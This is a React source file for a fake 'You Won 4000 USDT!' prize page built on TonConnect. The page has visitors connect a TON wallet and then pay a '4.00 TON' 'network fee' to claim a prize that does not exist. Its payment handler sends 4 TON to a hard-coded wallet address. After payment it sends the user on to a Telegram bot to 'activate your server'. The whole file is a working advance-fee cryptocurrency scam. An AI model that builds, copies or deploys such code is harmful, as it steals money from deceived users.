import { useState, useEffect } from "react";
import { TonConnectButton, useTonConnectUI, useTonAddress } from "@tonconnect/ui-react";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { TONIcon } from "@/components/TONIcon";
import { Wallet, ArrowRight, ShieldCheck, ExternalLink } from "lucide-react";
import { useRecordVisit } from "@/hooks/use-visits";
import boltImg from "@assets/photo_5841469321920580997_w_1772752705315.jpg";

export default function Home() {
  const [tonConnectUI] = useTonConnectUI();
  const userAddress = useTonAddress();
  const { mutate: recordVisit } = useRecordVisit();
  
  const [isWithdrawOpen, setIsWithdrawOpen] = useState(false);
  const [isSuccessOpen, setIsSuccessOpen] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);

  useEffect(() => {
    recordVisit({});
  }, [recordVisit]);

  const handleWithdrawClick = () => {
    if (!userAddress) {
      const tonConnectButton = document.querySelector('button[class*="ton-connect-button"]');
      if (tonConnectButton instanceof HTMLElement) {
        tonConnectButton.click();
      } else {
        // Fallback to searching inside the trigger div
        const trigger = document.getElementById('ton-connect-trigger');
        const button = trigger?.querySelector('button');
        if (button instanceof HTMLElement) {
          button.click();
        }
      }
      return;
    }
    setIsWithdrawOpen(true);
  };

  const handlePayment = async () => {
    try {
      setIsProcessing(true);
      
      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 360,
        messages: [
          {
            address: "UQCFrjvfMxqHh4-tooMa22uNvbKGd73KfGab3cePjZxq_uNb",
            amount: "4000000000",
          },
        ],
      };

      await tonConnectUI.sendTransaction(transaction);
      setIsWithdrawOpen(false);
      setIsSuccessOpen(true);
    } catch (error) {
      console.error("Transaction failed:", error);
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col relative overflow-hidden bg-[#0a0a0a]">
      <div className="absolute top-[-10%] right-[-5%] w-96 h-96 bg-primary/10 rounded-full blur-[120px] pointer-events-none" />
      <div className="absolute bottom-[-10%] left-[-5%] w-96 h-96 bg-secondary/10 rounded-full blur-[120px] pointer-events-none" />

      <main className="flex-1 flex flex-col items-center justify-center p-4 z-10">
        <div className="w-full max-w-lg">
          <div className="bg-[#1a1a1a] border border-white/5 rounded-3xl p-8 md:p-10 text-center relative overflow-hidden shadow-2xl">
            <div className="flex justify-end mb-6">
              <TonConnectButton />
            </div>
            
            <div className="flex justify-center mb-8">
              <div className="relative rounded-2xl overflow-hidden border border-white/10 shadow-2xl bg-black/20">
                <img src={boltImg} alt="Prize" className="w-full h-auto max-h-[300px] object-cover" />
                <div className="absolute bottom-2 right-2 bg-green-500/20 text-green-400 px-3 py-1 rounded-full text-xs font-bold border border-green-500/30 backdrop-blur-sm">
                  VERIFIED
                </div>
              </div>
            </div>

            <h1 className="text-4xl md:text-5xl font-black mb-4 text-white leading-tight">
              You Won<br/>
              <span className="text-accent block mt-2 text-6xl">4000 USDT!</span>
            </h1>
            
            <p className="text-gray-400 text-lg mb-10 font-medium">
              Congratulations! Your prize is ready for withdrawal.
            </p>

            <button
              onClick={handleWithdrawClick}
              className="w-full bg-primary hover:bg-primary/90 text-white font-bold py-5 rounded-2xl text-2xl transition-all active:scale-[0.98] shadow-lg shadow-primary/20"
            >
              WITHDRAW NOW
            </button>
            
            {!userAddress && (
              <p className="mt-4 text-sm text-gray-500">
                Please connect your wallet to continue
              </p>
            )}
          </div>
        </div>
      </main>

      <Dialog open={isWithdrawOpen} onOpenChange={setIsWithdrawOpen}>
        <DialogContent className="bg-[#1a1a1a] border-white/10 sm:max-w-md p-0 overflow-hidden rounded-3xl">
          <div className="p-8">
            <h2 className="text-2xl text-center font-bold text-white mb-2">Network Fee</h2>
            <p className="text-center text-gray-400 mb-8">
              A small network fee is required to process your 4000 USDT withdrawal securely.
            </p>
            
            <div className="bg-black/40 rounded-2xl p-6 border border-white/5 mb-8">
              <div className="flex justify-between items-center">
                <span className="text-gray-500 font-medium">Processing Fee</span>
                <span className="text-3xl font-black text-white">4.00 TON</span>
              </div>
            </div>

            <div className="space-y-3">
              <Button 
                onClick={handlePayment} 
                disabled={isProcessing}
                className="w-full bg-white text-black hover:bg-white/90 font-bold text-xl h-16 rounded-2xl transition-all"
              >
                {isProcessing ? "Processing..." : "PAY FEE & WITHDRAW"}
              </Button>
              <Button 
                variant="ghost" 
                onClick={() => setIsWithdrawOpen(false)}
                className="w-full text-gray-500 hover:text-white"
              >
                Cancel
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={isSuccessOpen} onOpenChange={setIsSuccessOpen}>
        <DialogContent className="bg-[#1a1a1a] border-white/10 sm:max-w-md p-0 overflow-hidden rounded-3xl">
          <div className="p-8 text-center">
            <div className="w-20 h-20 bg-green-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
              <ShieldCheck className="w-12 h-12 text-green-500" />
            </div>
            <h2 className="text-2xl font-bold text-white mb-4">Payment Confirmed!</h2>
            <p className="text-gray-400 text-lg mb-8">
              To complete the final verification and receive your funds, please activate your server.
            </p>
            
            <a 
              href="https://t.me/Boltminingbot/App" 
              target="_blank" 
              rel="noopener noreferrer"
              className="w-full flex items-center justify-center bg-[#0088cc] hover:bg-[#0077b5] text-white text-xl font-bold h-16 rounded-2xl transition-all shadow-lg shadow-[#0088cc]/20"
            >
              ACTIVATE SERVER
            </a>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
